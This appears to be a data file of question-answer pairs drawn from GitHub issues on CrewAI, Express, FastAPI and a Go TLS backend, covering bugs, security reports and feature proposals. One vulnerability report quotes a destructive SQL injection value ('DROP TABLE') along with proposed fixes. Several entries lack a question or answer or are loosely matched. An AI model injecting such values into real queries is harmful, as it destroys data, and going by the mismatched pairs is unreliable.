For users deploying CrewAI behind a FastAPI server via `ag_ui_crewai.endpoint.add_crewai_crew_fastapi_endpoint` for AG-UI / CopilotKit, these LLM calls fire during module import before `uvicorn` binds to its HTTP port. Any LLM provider hiccup during container startup, such as OpenAI 500/503/rate-limit, network/DNS failure, slow cold-start on a mock/proxy server, invalid credentials, or Litellm `APIError`, `Timeout`, or `APIConnectionError`, can crash the Python process before the HTTP server is listening. In Railway, Kubernetes, AWS ECS, or Fly.io this causes readiness/health checks to fail and deployments to roll back.

We observed this stack trace on a Railway-hosted CopilotKit showcase when our LLM mock returned a transient schema error:

```text
File "/app/agent_server.py", line 27, in <module>
    add_crewai_crew_fastapi_endpoint(app, LatestAiDevelopment(), "/")
File ".../ag_ui_crewai/endpoint.py", line 250, in add_crewai_crew_fastapi_endpoint
    add_crewai_flow_fastapi_endpoint(app, ChatWithCrewFlow(crew=crew), path)
File ".../ag_ui_crewai/crews.py", line 56, in __init__
    self.crew_chat_inputs = crew_chat_generate_crew_chat_inputs(...)
File ".../crewai/cli/crew_chat.py", line 387, in generate_crew_chat_inputs
    description = generate_input_description_with_ai(input_name, crew, chat_llm)
File ".../crewai/cli/crew_chat.py", line 481, in generate_input_description_with_ai
    response = chat_llm.call(messages=[...])
File ".../crewai/llm.py", line 956, in call
    return self._handle_non_streaming_response(...)
...
APIError: <connection failure>
```

The container exits with code 1 and never binds a port. This affects `crewai>=0.130.0`, `ag-ui-crewai==0.1.5`, and Python 3.12. `ag-ui-crewai` main reportedly already has a deferred-construction fix in `endpoint.py`, but no release yet, and the underlying CrewAI helper functions still have no timeout, retry/fallback, try/except graceful default, or opt-out. We are currently monkey-patching both functions to return static strings before `ag_ui_crewai` is imported, via https://github.com/CopilotKit/CopilotKit/pull/3974.

Should CrewAI change these helpers or the AG-UI integration so startup/import does not depend on live LLM calls, for example by lazy-initializing on first request, falling back to static descriptions on LLM failure, making AI-generated descriptions opt-in, or adding timeout plus bounded retry?
qa_pairs.answer: The maintainer agreed this is worth fixing at the library/helper layer even though `ag-ui-crewai` already has a deferred-construction fix on `main`. Their preferred low-risk shape is to never make startup/import depend on a live LLM call, treat AI-generated descriptions as best-effort UX polish, and fall back to static strings on failure. They specifically recommended wrapping `generate_input_description_with_ai` and `generate_crew_description_with_ai` with a short timeout plus a generic fallback, so provider failures do not cause server readiness failure.

title: [FEATURE] HDP token support for crew delegation provenance

qa_pairs.question:
In CrewAI, crews can delegate tasks across agents, but there is currently no cryptographic record of which human authorized the original task or what scope was granted. HDP (Human Delegation Provenance) proposes a root token signed by the human, with each agent hop adding a signed extension so recipients can verify the full chain offline.

Draft spec: https://datatracker.ietf.org/doc/draft-helixar-hdp-agentic-delegation/
Package: `npm install @helixar_ai/hdp`
GitHub: https://github.com/Helixar-AI/HDP

I would like to propose a CrewAI integration, either as a middleware callback or a crew-level HDP context that auto-propagates through task delegation. The desired solution is a lightweight HDP middleware that plugs into CrewAI's existing callback hooks, with no changes to core crew logic required.

Two touch points:

- `BeforeKickoff` hook: issues an HDP root token signed by the human caller, embedding the task intent, authorized tools, and data classification in the token's `scope` field. The token is attached to the crew's shared context.
- `TaskCallback` / `StepCallback` hook: calls `extendChain()` on each task execution, adding a signed hop record identifying the agent, its action summary, and its parent in the delegation chain.

The result should be a tamper-evident audit trail, verifiable offline with a single Ed25519 public key, covering every task CrewAI executes on behalf of the original human.

Minimal integration surface:

```python
from hdp_crewai import HdpMiddleware   # thin wrapper around @helixar_ai/hdp

crew = Crew(
    agents=[...],
    tasks=[...],
    callbacks=HdpMiddleware(signing_key=key, session_id=session_id)
)
```

The middleware should be non-blocking: if HDP token operations fail, crew execution continues and the failure is logged rather than raised. No changes to existing crew configuration should be needed to adopt it.

There is also timely context from a zero-click prompt injection vulnerability in the Claude Chrome Extension disclosed on 27/03/2026, where the attack worked because the extension could not distinguish a real user instruction from an injected one; HDP would address this by requiring a valid delegation chain. Coverage: https://thehackernews.com/2026/03/claude-extension-flaw-enabled-zero.html

Is there interest in supporting this HDP integration for CrewAI, and is there a package or PR I can use or contribute to?
qa_pairs.answer: The companion package `hdp-crewai` has been published on PyPI: https://pypi.org/project/hdp-crewai/ and can be installed with `pip install hdp-crewai`. It hooks into CrewAI's existing callback system (`before_kickoff_callbacks`, `step_callback`, `task_callback`, `after_kickoff_callbacks`) with zero changes to crew configuration, and addresses scope enforcement, delegation depth limits, token performance, offline verification, and memory integration. A PR with a full working example is #5135.

title: SQL injection in SnowflakeSearchTool via database and schema parameters

qa_pairs.question:
In crewAI's `SnowflakeSearchTool`, I noticed that the `database` and `snowflake_schema` parameters in the `_run` method appear to be interpolated directly into SQL without validation or quoting:

```python
if database:
    await self._execute_query(f"USE DATABASE {database}")
if snowflake_schema:
    await self._execute_query(f"USE SCHEMA {snowflake_schema}")
```

These values come from `SnowflakeSearchToolInput`, where both fields are plain `str | None` with no pattern constraints, unlike `SnowflakeConfig.account`, which has `pattern=r"^[a-zA-Z0-9\-_]+$"`. Since `_execute_query` calls `cursor.execute(query)` directly, a malicious value such as `test_db; DROP TABLE users; --` could be executed as SQL. In a CrewAI context, these parameters can be filled by an LLM agent based on task instructions, so prompt injection in upstream task context could influence them.

My suggested fix is to validate both identifiers and quote them:

```python
# On SnowflakeSearchToolInput
database: str | None = Field(None, pattern=r"^[A-Za-z_][A-Za-z0-9_$]*$")
snowflake_schema: str | None = Field(None, pattern=r"^[A-Za-z_][A-Za-z0-9_$]*$")
```

```python
# In _run()
if database:
    await self._execute_query(f'USE DATABASE "{database}"')
if snowflake_schema:
    await self._execute_query(f'USE SCHEMA "{snowflake_schema}"')
```

Snowflake's `USE DATABASE` does not support bind parameters, so identifier validation seems appropriate. The `query` parameter is also unsanitized, but that appears to be by design because the tool executes SQL. I also noticed a similar second-order injection pattern in `nl2sql_tool.py:57`, where `table_name` from a prior query result is interpolated into an `information_schema` query; that one already has `# noqa: S608` and documentation from PR #4465, but no code fix yet.

Would you like me to put together a PR for this?
qa_pairs.answer: The maintainer said a PR would be much appreciated and that they were surprised Bandit did not catch the issue. They offered to review it if submitted today or tomorrow; otherwise, they would take it themselves.

title: MCP tool calling has no per-message authentication or integrity verification

qa_pairs.question:
CrewAI's MCP integration enables agents to call tools via MCP, but MCP itself appears to provide no cryptographic identity or message integrity layer. Specifically:

- No agent identity: no passport or certificate mechanism for agents.
- No message signing: JSON-RPC messages are unsigned, so parameters can be modified in transit.
- No tool integrity: tool definitions are not signed; tool poisoning (OWASP MCP03) is a known attack vector.
- No replay protection: the same tool call can be replayed indefinitely.

OWASP has published an MCP Top 10 covering these risks: https://owasp.org/www-project-mcp-top-10/

There is also an IETF Internet-Draft intended to address this:
- IETF Datatracker: https://datatracker.ietf.org/doc/draft-sharif-mcps-secure-mcp/
- Reference implementations: npm https://www.npmjs.com/package/mcp-secure/ and PyPI https://pypi.org/project/mcp-secure/ zero dependencies
- Interactive demo: https://agentsign.dev/playground

The draft adds agent passports using ECDSA P-256, per-message signing, tool definition signatures, and nonce-based replay protection, while remaining backward-compatible with current MCP.

How should CrewAI think about integrating or addressing these MCP security gaps?
qa_pairs.answer: The answer separated the problem into three complementary layers rather than a single competing fix: transport integrity, runtime identity, and policy enforcement. MCPS/`crewai-mcps` covers message signing, replay protection, and tool definition pinning; OATR or AgentID covers whether the agent runtime/identity is valid and non-revoked; APS covers whether a specific authenticated call should execute under its delegation constraints. The suggested composition is that MCPS first verifies the message arrived intact, then APS evaluates whether the authenticated sender is authorized to make that specific call.

title: [Security] The Python documentation recommends using `defusedxml` instead of `xml` because the native Python `xml` library is vulnerable to XML External Entity (XXE) attacks. These attacks can leak confidential data and "XML bombs" can cause denial of service.

qa_pairs.question: In `crewAIInc/crewAI`, file `lib/crewai-tools/src/crewai_tools/rag/loaders/xml_loader.py` line 2 uses the native Python `xml` library. The Python documentation recommends using `defusedxml` instead of `xml` because the native Python `xml` library is vulnerable to XML External Entity (XXE) attacks, which can leak confidential data, and "XML bombs" can cause denial of service. Should this import be changed to avoid these XML security risks?
qa_pairs.answer:
Yes. Replace the vulnerable import:
```python
import xml.etree.ElementTree as ET
```
with the secure drop-in replacement:
```python
from defusedxml import ElementTree as ET
```
Install it with `pip install defusedxml`; `defusedxml` prevents XXE attacks and blocks "billion laughs" DoS attacks.

title: Feature: Cryptographic action receipts for multi-agent crew audit trails

qa_pairs.question:
CrewAI currently has no standard way to cryptographically prove, across a multi-agent crew execution: which agent executed which task, what inputs each agent received, what outputs each agent produced, and whether any output was tampered with between agent handoffs. This is a compliance blocker for enterprise deployments and a trust gap for agent-to-agent commerce such as x402 and Stripe agent checkout.

I’m proposing Agent Action Receipts (AAR) v1.0, an MIT-licensed open standard for signed receipts that chain across agent actions: https://github.com/Cyberweasel777/agent-action-receipt-spec. It uses Ed25519 signatures over canonicalized JSON using JCS-SORTED-UTF8-NOWS, SHA-256 input/output hashing so receipts are verifiable without exposing raw data, per-agent signing of task execution to create a verifiable chain of custody, and explicit failed/partial task statuses (`status: 'failure' | 'partial'`).

For CrewAI specifically, the conceptual integration would look like:

```python
# Conceptual integration
@task
def research_task(self, agent, context):
    result = agent.execute(context)
    receipt = sign_action_receipt(
        agent_id=agent.role,
        principal=crew.manager,
        action={'type': 'research', 'target': context.topic},
        input_hash=sha256(context),
        output_hash=sha256(result),
    )
    return result, receipt
```

Each crew execution would produce a receipt chain, giving a complete audit trail from delegation to final output. The proposal also claims ecosystem compatibility with Mastercard Verifiable Intent, x402, and Aztec L2 ZK-compatible verification. The TypeScript SDK is live on npm:

```bash
npm install botindex-aar
```

The Python SDK is in development. Links: spec https://github.com/Cyberweasel777/agent-action-receipt-spec, landing page https://aar.botindex.dev, npm package https://www.npmjs.com/package/botindex-aar. Is there a path forward for CrewAI integration, and what is the status of the AAR spec/SDK support for this kind of audit-trail receipt chain?
qa_pairs.answer: AAR v1.1 shipped with the discussed `evidenceRef` support. The spec, schema, and example are live: the spec is at https://github.com/Cyberweasel777/agent-action-receipt-spec Section 4.3.8, the schema is `schema/receipt.json` where `evidenceRef` is an optional array of typed hash pointers, and the example is https://github.com/Cyberweasel777/agent-action-receipt-spec/blob/main/examples/evidence-ref-receipt.json. The field supports external evidence bundle types such as `aelitium/binding-bundle`, `ai-decision-tracer/audit-trail`, `insumer/attestation`, `scc/certificate-chain`, or custom types, with each entry carrying a content hash and optional retrieval URI; receipt verification does not depend on evidence availability. A Python SDK also shipped as `pip install botindex`, and the referenced commit is https://github.com/Cyberweasel777/agent-action-receipt-spec/commit/0a24988.

title: RC1 Review Request: AAR-MCP-2.0 Verifiable Interaction Layer (Conformance Gate included)

qa_pairs.question:
In the context of AAR-MCP-2.0 RC1 as a verifiable interaction layer for MCP/agent tool calls with tamper-evident journals, checkpoint signatures, conformance vectors, fail-closed enforcement, and an audit bundle, I’m trying to validate the claimed hard-gate / capability-security model. If the journal is a capability broker and the side-effect primitives are structurally unreachable without a journal-issued capability bound to a cryptographically committed intent, where does the gate physically live today?

title: Kevros Governance tools for CrewAI — action verification + audit trails

qa_pairs.question: In the proposed Kevros Governance Tools for CrewAI, the verify/attest/bind-intent tools appear to be invoked by the agent itself as CrewAI tools. That means a compromised or misaligned agent could simply skip calling them and still produce durable side effects such as trades, API calls, or deployments through other available tools. Hash-chained attestation solves log mutability, but if the attested path is not the only path to action execution, an agent that bypasses governance tools produces unauthenticated actions that are structurally indistinguishable from a scenario where governance was never configured. Is there an enforcement layer that makes the governance call a prerequisite for the downstream action, rather than a voluntary step the agent elects to take?
qa_pairs.answer: At the tool layer, any tool call is voluntary; that is inherent to the tool-use pattern across frameworks. Kevros handles enforcement at the infrastructure layer: verified actions produce signed attestations that downstream services can validate as a prerequisite. If an agent skips governance, it produces no valid attestation, so the downstream action is rejected rather than merely going unrecorded.
grounding_sources: Kevros infrastructure-level enforcement via signed attestations validated by downstream services

title: [BUG] Regression in CrewAI 1.9.3: custom BaseTool wrapper around BedrockKBRetrieverTool gets called without args (_run() missing query) and enters infinite tool-use loop

qa_pairs.question:
In crewAI 1.9.3, after upgrading from crewAI 1.6.1, my custom `BaseTool` wrapper around `BedrockKBRetrieverTool` no longer receives its required `query` argument and the agent enters a repeated tool-use loop. The tool is defined with an args schema requiring `query`, for example:

```python
from typing import Type
import json
from pydantic import BaseModel, Field, PrivateAttr
from crewai.tools import BaseTool
from crewai_tools.aws.bedrock.knowledge_base.retriever_tool import BedrockKBRetrieverTool

class KBQueryInput(BaseModel):
    """Input schema for KB retrieval tool."""
    query: str = Field(..., description="Natural language query for the knowledge base.")

class ParsedBedrockKBRetrieverTool(BaseTool):
    name: str = "kb.retrieve"
    description: str = "Retrieve from Bedrock KB and parse results into RetrievedRef-shaped objects."
    args_schema: Type[BaseModel] = KBQueryInput
    _inner: BedrockKBRetrieverTool = PrivateAttr()

    def __init__(self, inner: BedrockKBRetrieverTool):
        super().__init__()
        self._inner = inner

    def _run(self, query: str) -> str:
        raw = self._inner._run(query)
        # parsing logic omitted
        return raw

def build_kb_retrieval_tool(knowledge_base_id: str, n_results: int = 100) -> BaseTool:
    inner = BedrockKBRetrieverTool(
        knowledge_base_id=knowledge_base_id,
        number_of_results=n_results
    )
    return ParsedBedrockKBRetrieverTool(inner=inner)
```

The original error was:

```shell
Tool kb_retrieve executed with result: Error executing tool: ParsedBedrockKBRetrieverTool._run() missing 1 required positional argument: 'query'...
```

After testing the first proposed validation PR, I put a breakpoint in `crew_agent_executor.py` and saw that `args_dict` is an empty dict. That PR only changed the error to a Pydantic validation error:

```shell
Tool kb_retrieve executed with result: Error executing tool: 1 validation error for KBQueryInput
query
  Field required [type=missing, input_value={}, input_type=dict]
```

The root cause identified was the L722 short-circuit:

```python
func_args = func_info.get("arguments", "{}") or tool_call.get("input", {})
```

For Bedrock-style tool calls like:

```json
{
  "toolUseId": "...",
  "name": "...",
  "input": {...}
}
```

there is no `function` key, so `func_info.get("arguments", "{}")` returns the truthy string `"{}"`, `tool_call.get("input", {})` is never evaluated, and Bedrock `input` is ignored. The proposed minimal fix was:

```python
func_args = func_info.get("arguments") or tool_call.get("input", {})
```

Can you send me the new PR for this fix so I can test it locally?
qa_pairs.answer: The new PR is https://github.com/crewAIInc/crewAI/pull/4518. It contains only the minimal one-line fix for the L722 short-circuit issue.

title: [BUG] CrewAI telemetry breaks EU data locality

qa_pairs.question:
During a review of CrewAI, we identified issues with telemetry collection and transfer that may not fully comply with GDPR. Telemetry is collected and transferred to https://telemetry.crewai.com, outside the EU. The documentation says no prompts, task descriptions, or agent backstories are collected unless `share_crew` is enabled, but even without that feature the data could potentially be personal data if linked to identifiable individuals or actions, for example in desktop implementations where user interactions could be linked through IP addresses or other unique identifiers.

The documentation also appears ambiguous about what constitutes “detailed data” when `share_crew` is enabled, says there is currently no way to disable telemetry, and does not fully address where data resides, how it can be queried, or how users can revoke consent. GDPR requires consent to be freely given, specific, informed, and unambiguous. The telemetry is transferred to the US, and the documentation does not specify safeguards such as SCCs or an adequacy decision.

Related issues: #1177 #266 #372 #241.

Recommendations:
1. Reevaluate whether collected telemetry could be personal data, especially indirect identifiers like IP addresses, and clarify exactly what is collected with and without `share_crew`.
2. Add explicit opt-in consent or at least a clear way to opt out/revoke consent.
3. Update documentation to state where data is stored, how users can access/delete it, and how consent is managed.
4. Review transfer safeguards and consider a DPIA.

There is also concern that many users believe telemetry should be opt-in. Similar products provide disable options such as:

Chroma
https://docs.trychroma.com/telemetry
ANONYMIZED_TELEMETRY = FALSE

Langchain
https://docs.smith.langchain.com/old/tracing/quick_start
LANGCHAIN_TRACING_V2 = False

CrewAI currently appears to be disableable with:

```
OTEL_SDK_DISABLED=True 
```

but this needs to be clear and unambiguous in documentation. #1177 should remove `BASE_URL` from allowed sensitive data because it could contain all or any of:

```
https://user:password@secret_project.somewhere.com:12345/next_iphone_model_ai_v0.1
```

The documentation currently says “We don't offer a way to disable it now, but we will in the future.” It should instead document:

```
OTEL_SDK_DISABLED=true
```

The collected data should be documented unambiguously, for example with a simple table of default collected data and optionally shared data:

| Defaulted | Data                                      | Reason                                                                                                                                                       |
|-----------|-------------------------------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------|
| Yes       | Version of CrewAI                         | Assessing the adoption rate of our latest version helps us understand user needs and guide our updates.                                                      |
| Yes       | Python Version                            | Identifying the Python versions our users operate with assists in prioritizing our support efforts for these versions.                                        |
| Yes       | General OS Information                    | Details like the number of CPUs and the operating system type (macOS, Windows, Linux) enable us to focus our development on the most used operating systems.  |
| Yes       | Number of Agents and Tasks in a Crew      | Ensures our internal testing mirrors real-world scenarios, helping us guide users towards best practices.                                                    |
| Yes       | Crew Process Utilization                  | Understanding how crews are utilized aids in directing our development focus.                                                                                 |
| Yes       | Memory and Delegation Use by Agents       | Insights into how these features are used help evaluate their effectiveness and future development.                                                          |
| Yes       | Task Execution Mode                       | Knowing whether tasks are executed in parallel or sequentially influences our emphasis on enhancing parallel execution capabilities.                          |
| Yes       | Language Model Utilization                | Supports our goal to improve support for the most popular languages among our users.                                                                          |
| Yes       | Roles of Agents within a Crew             | Understanding the various roles agents play aids in crafting better tools, integrations, and examples.                                                       |
| Yes       | Tool Usage                                | Identifying which tools are most frequently used allows us to prioritize improvements in those areas.                                                        |
| No        | Goal (Opt-In)                             | Part of detailed crew and task execution data, enabling deeper insight into usage patterns.                                                                  |
| No        | Backstory (Opt-In)                        | Part of detailed crew and task execution data, providing context for task execution and improving user experience.                                           |
| No        | Context (Opt-In)                          | Part of detailed crew and task execution data, essential for understanding how tasks are set up and executed.                                                |
| No        | Output (Opt-In)                           | Part of detailed crew and task execution data, offering insights into the final results of task execution.                                                   |
| No        | Human Input (Opt-In)                      | Captures whether human input was required during task execution, helping to improve human-agent interaction mechanisms.                                      |
| No        | Agent Verbosity (Opt-In)                  | Indicates whether agents were set to verbose mode, providing insights into detailed logging and communication preferences.                                    |
| No        | Max Iterations (Opt-In)                   | Records the maximum number of iterations allowed for agents, aiding in the analysis of task complexity and agent efficiency.                                 |
| No        | Max RPM (Opt-In)                          | Tracks the maximum RPM (Requests Per Minute) settings, useful for understanding performance constraints and resource allocation.                              |
| No        | Tools Names (Opt-In)                      | Identifies the specific tools used by agents during tasks, helping to prioritize tool development and support.                                                |
| No        | Tool Reuse (Opt-In)                       | Logs repeated usage of tools by agents, helping to identify potential areas for tool optimization or additional support.                                      |
| No        | Task Description (Opt-In)                 | Logs the description of each task, providing context for understanding task objectives and expected outcomes.                                                |
| No        | Expected Output (Opt-In)                  | Captures the expected output for tasks, useful for comparing against actual outcomes and measuring task success.                                              |
| No        | Task Output (Opt-In)                      | Records the actual output of tasks, enabling the assessment of task completion and quality of results.                                                       |

There is also still the issue of querying/deleting collected data and locality. Since CrewAI is not explicitly targeting EU users, CrewAI may have exemptions, but implementors targeting the EU do not; please consider including a note to developers to disable telemetry to be GDPR compliant. How will CrewAI address these telemetry, GDPR, opt-out, `BASE_URL`, documentation, and data-locality concerns?
qa_pairs.answer: Commits were added and were planned to go out in the next version. After clearing with legal, CrewAI removed the `base_url` attribute, confirmed that after removing `base_url` the collected data is not considered personal information under GDPR or PII, added a table of collected data, added instructions for disabling telemetry, added a disclaimer that agent roles and tool names are collected by default so users should not include personal information there if telemetry is not disabled, and confirmed that data localization is not a problem because the data is not considered personal information under GDPR.
grounding_sources: CrewAI commits for the next version

title: update to `qs@^6.14.1`

qa_pairs.question: In Express, the `qs` dependency has a recently disclosed security flaw referenced by GitHub Advisory GHSA-6rw7-vpxm-498p. I could not find an Express issue or PR about this flaw or a possible solution, and projects using Express appear vulnerable without a solution. Can Express update to `qs@^6.14.1` or clarify when this will be addressed?
qa_pairs.answer: The maintainer answered that the reported `qs` vulnerability, identified in the thread as CVE-2025-15284, is already addressed by default in current Express releases. Express 4 depends on `"qs": "~6.14.0"`, which resolves to `>=6.14.0 <6.15.0` and pulls in `6.14.1`, while Express 5 depends on `"qs": "^6.14.0"`, which also pulls patched versions automatically. Therefore, users installing Express without overriding dependency resolutions already receive a fixed `qs` version, and the issue is not an unpatched vulnerability in Express itself.

The maintainer said this would be solved by publishing `body-parser@2.2.2` with a compatibility patch for `qs@6.14.1`, so Express 5.x would work as expected out of the box. As an interim workaround, they suggested using npm `overrides` to force `qs` to `6.14.0` for `express` and `body-parser`, while noting that this would trigger the CVE alert. They later confirmed that `body-parser@2.2.2` had been released and solved the issue.

qa_pairs.question: For the `qs` 6.14.1 array parsing behavior change, is the Express 5.x fix going to be ported back to Express 4.x, or is the best path in Express 4.x to manually override the `arrayLimit` value with a custom query parser?
qa_pairs.answer: A community response explained that the Express 5.x fix involved updating `body-parser`, because in Express 5 `express.urlencoded()` uses `body-parser` and non-extended mode switched from `querystring` to `qs`. For the extended query parser used for `req.query`, both Express 4 and 5 only set `allowPrototypes: true` and otherwise use `qs` defaults, so long query strings with more than 20 unindexed array elements can become objects after updating `qs`. The suggested path for such query arrays was to use a custom `query parser` in both Express 4 and 5.

title: sendFile fails within .git folder

qa_pairs.answer: The `dotfiles` option of `res.sendFile` defaults to `"ignore"`. That dotfiles check applies not only to the filename but also to directories, so a path containing `.git` is ignored. To allow files or directories starting with a dot, pass `{ dotfiles: "allow" }` to `res.sendFile`.
grounding_sources: Express 5.x API documentation for res.sendFile dotfiles option

qa_pairs.question:
Given the same Express setup where `res.sendFile(path.join(baseDir, ".git/HEAD"))` fails because of dotfile handling, why can I still access `/.git/HEAD` without issues when I mount the `.git` directory as the static root like this?

```js
router.use("/.git", express.static(path.join(baseDir, ".git")));
```
qa_pairs.answer: The root directory is not checked for dotfiles because it is explicitly set by the programmer; the `dotfiles` option is intended to prevent accidental leaks. With `res.sendFile`, you can similarly set the root directory to `.git` and keep `dotfiles` as `"ignore"`, for example: `res.sendFile("HEAD", { root: path.join(baseDir, ".git") });`.

title: Routing bug - URIError: Failed to decode param '$%^'

qa_pairs.question:
In an Express app, I have an API route with a route parameter. If the route param contains the three characters in this sequence, `$%^`, the router returns an error like: `URIError: Failed to decode param '12321$%^4ABCD'
   at decodeURIComponent (<anonymous>)` A normal call works, but an invalid call containing that sequence fails. Why does this happen, and how can I prevent it? I also want to catch this in an API and return a JSON error response like `{ status: -1, message: '*****' }`. I tried adding error middleware, but it did not catch the error; does the middleware location matter, and what should the code look like?
qa_pairs.answer:
This is working as intended: the app is not crashing; Express is responding with a 400 Bad Request because `%` in a URL starts a percent-encoded sequence and must be followed by two hex digits. To send a literal `%`, the URL should contain `$%25^`. To return JSON or a custom response, add Express error-handling middleware after the route that can throw this routing error; Express executes middleware top to bottom. The maintainer gave this working example:

```js
const app = require('express')()
app.get('/app/:appId', (req, res) => res.send('get app'))
app.use((err, req, res, next) => res.send('error!'))
app.listen(3000)
```
grounding_sources: Express middleware executes top to bottom and error middleware must be declared after the route

title: Can express req.headers[x] be an array?

qa_pairs.answer: `req.headers` comes from Node.js HTTP; Express does not set anything there, so the rules and types are those of the Node.js version being used. Node’s documentation (https://nodejs.org/dist/latest-v21.x/docs/api/http.html#messageheaders) says `set-cookie` is always an array and duplicate values are added to that array. The maintainer did not think `set-cookie` can be safely combined into a string, and noted it is essentially nonexistent for `set-cookie` to appear in a request to an Express server because it is a response header, not a request header.

title: Using scopes on `Security()` changes dependency inheritance

qa_pairs.question:
In FastAPI 0.87.0 on Linux with Python 3.11.0, why does adding `scopes=["activate"]` to `Security()` appear to change dependency inheritance/caching so that my SQLAlchemy `Session` dependency is instantiated twice? Example:

```python
async def get_authenticated_user(security_scopes: SecurityScopes,
                                 session: Session = Depends(get_session),
                                 token: str = Depends(oauth2_scheme),
                                 ):

    print(f"get_authenticated_user: {id(session)}")
    return

@router.post('/activate', status_code=204)
async def user_activate(session: Session = Depends(get_session),
                        user: UserAccountInDatabase = Security(
                            get_authenticated_user,
                            scopes=["activate"])):
    print(f"user_activate: {id(session)}")
    return
```

With `scopes=["activate"]`, it prints different session IDs:

```text
get_authenticated_user: 140600933628496
user_activate: 140600933312848
```

If I remove `scopes=["activate"]` from `Security()`, it prints the same session ID:

```text
get_authenticated_user: 139952151843088
user_activate: 139952151843088
```

I discovered this when committing a change to a `UserAccountInDatabase` object and SQLAlchemy complained that the object does not belong to the same `Session`. Is this related to `SecurityScopes` being instantiated by `Security()`? I also tried manually adding scopes like this:

```python
activation_security_scope = SecurityScopes(["activate"])
@router.post('/activate', status_code=204)
async def user_activate(session: Session = Depends(get_session),
                        security_scopes: SecurityScopes = activation_security_scope,
                        user: UserAccountInDatabase = Depends(
                            get_authenticated_user)):
    print(f"user_activate: {id(session)}")
    print(security_scopes.scope_str)
```

but `security_scopes` is empty, almost as if it is overwritten somewhere, maybe by `Depends(get_authenticated_user)`. Am I misunderstanding how FastAPI dependencies and security scopes propagate?
qa_pairs.answer: FastAPI’s `Dependant` object has a `cache_key` used by the dependency resolver, and that key is generated from both the dependency function reference and the security scopes. When `get_authenticated_user` is used as a security dependency with `scopes=["activate"]`, its sub-dependency `Depends(get_session)` is cached under a key including `('activate')`, while the route-level `Depends(get_session)` without scopes is cached under a key with empty scopes, so they are treated as different cached dependencies. The commenter says this might be a security feature and points to FastAPI documentation on dependency caching and dependency trees with OAuth2 scopes.
grounding_sources: FastAPI documentation on using the same dependency multiple times: https://fastapi.tiangolo.com/tutorial/dependencies/sub-dependencies/?h=dependenc#using-the-same-dependency-multiple-times
FastAPI documentation on dependency tree and scopes: https://fastapi.tiangolo.com/advanced/security/oauth2-scopes/?h=dependency#dependency-tree-and-scopes

title: "request.json()" hangs indefinitely in middleware

qa_pairs.question:
In FastAPI 0.79.0 on Ubuntu 22.04 with Python 3.10.4, I have middleware that reads the request body as JSON before passing the request to the endpoint, but the request hangs indefinitely. I run with `uvicorn main:app --reload` and call it with `curl -X 'POST'   'http://localhost:8000/test'   -H 'accept: application/json'   -H 'Content-Type: application/json'   -d '{"test": "test"}'`. The equivalent code using `app = Starlette()` responds correctly. Here is the code:

```python
from fastapi import FastAPI, Request, Response
from starlette.middleware.base import BaseHTTPMiddleware, RequestResponseEndpoint


class Middleware(BaseHTTPMiddleware):

    async def dispatch(self, request: Request, call_next: RequestResponseEndpoint) -> Response:
        await request.json()
        response = await call_next(request)
        return response


app = FastAPI()
app.add_middleware(Middleware)


@app.post("/test")
async def test(test: dict) -> dict:
    return {"data": "test"}
```

I need to read the body in JSON format in several middleware in order to process the data for various reasons such as logging, security, and sanitizing. What is the correct implementation to avoid halting the program?
qa_pairs.answer:
You can ref this issue: https://github.com/tiangolo/fastapi/issues/394

in summary it is a bug or design issue from starlette, and there is work around:

```python
from typing import Mapping

from starlette.requests import Request

from fastapi import FastAPI, APIRouter, Depends

app = FastAPI()
api_router = APIRouter()

@api_router.post("/")
def read_root(arg: Mapping[str, str]):
    return {"Hello": "World"}

async def auth_middleware(request: Request):
    # you can implement your auth here
    print(await request.json())

# the trick here is including auth_middleware in the dependencies:
app.include_router(api_router, dependencies=[Depends(auth_middleware)])
```
thus this middleware logic will work on every requests, we use it same way in our production env, works fine.

note: `Dependencies` will inject your auth logic into each request, for more detail ref: https://fastapi.tiangolo.com/tutorial/dependencies/

In FastAPI 0.78.0 on Linux with Python 3.8.10, I am running a standard FastAPI app with CORS middleware:

```python
application = FastAPI()

application.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)
```

qa_pairs.answer: This can happen when FastAPI/Uvicorn is behind a proxy and the forwarded HTTPS headers are not trusted for the client/proxy IP. The maintainer also noted that `--forwarded-allow-ips` should be limited to the address of the proxy only.

title: jsonable_encoder alters json_encoders of Pydantic objects

qa_pairs.question:
In FastAPI 0.78.0 on Linux with Python 3.9.2 and Pydantic 1.9.1, `jsonable_encoder` appears to mutate a Pydantic model's `__config__.json_encoders` when I pass `custom_encoder`, so later calls without `custom_encoder` expose the secret value instead of masking it. Passing `custom_encoder` should only affect the current call and not modify global/model config state. Is this a bug, and would copying the encoder before updating it be the right fix?

```python
from pydantic import BaseModel, SecretStr
from fastapi.encoders import jsonable_encoder


class Credentials(BaseModel):
    password: SecretStr


ENCODERS = {SecretStr: lambda v: v.get_secret_value() if v is not None else None}

creds = Credentials(password="helloworld")

a = jsonable_encoder(creds)
print(a)  # {'password': '**********'}, as expected
b = jsonable_encoder(creds, custom_encoder=ENCODERS)
print(b)  # {'password': 'helloworld'}, as expected
c = jsonable_encoder(creds)
print(c)  # gives {'password': 'helloworld'}, but should be {'password': '**********'}?


creds = Credentials(password="123456789")

d = jsonable_encoder(creds)
print(d)  # gives {'password': '123456789'}, but should be {'password': '**********'}?
```
qa_pairs.answer:
Yes; the response says copying the encoder before modifying it fixes the issue. Because FastAPI requires at least Python 3.6, the dictionaries could also be merged with `{**encoder, **custom_encoder}` instead of mutating with `encoder.update(custom_encoder)`. The responder noted they were not yet sure whether the change had negative side effects or whether there was a reason `.update()` was originally used.

Example Patch:
```diff
diff --git a/fastapi/encoders.py b/fastapi/encoders.py
index 4b7ffe31..39cc2925 100644
--- a/fastapi/encoders.py
+++ b/fastapi/encoders.py
@@ -52,7 +52,7 @@ def jsonable_encoder(
     if isinstance(obj, BaseModel):
         encoder = getattr(obj.__config__, "json_encoders", {})
         if custom_encoder:
-            encoder.update(custom_encoder)
+            encoder = {**encoder, **custom_encoder}
         obj_dict = obj.dict(
             include=include,  # type: ignore # in Pydantic
             exclude=exclude,  # type: ignore # in Pydantic
```

title: HTTP backend: TLS config defaults to TLS 1.0, allows protocol downgrade

qa_pairs.answer: No. The HTTP backend currently uses TLS 1.2 because when calling code does not set `Config.MinVersion`, Go's `crypto/tls` defaults the minimum version to TLS 1.2. The maintainer pointed to the Go `crypto/tls` documentation stating: “By default, TLS 1.2 is currently used as the minimum. TLS 1.0 is the minimum supported by this package.”

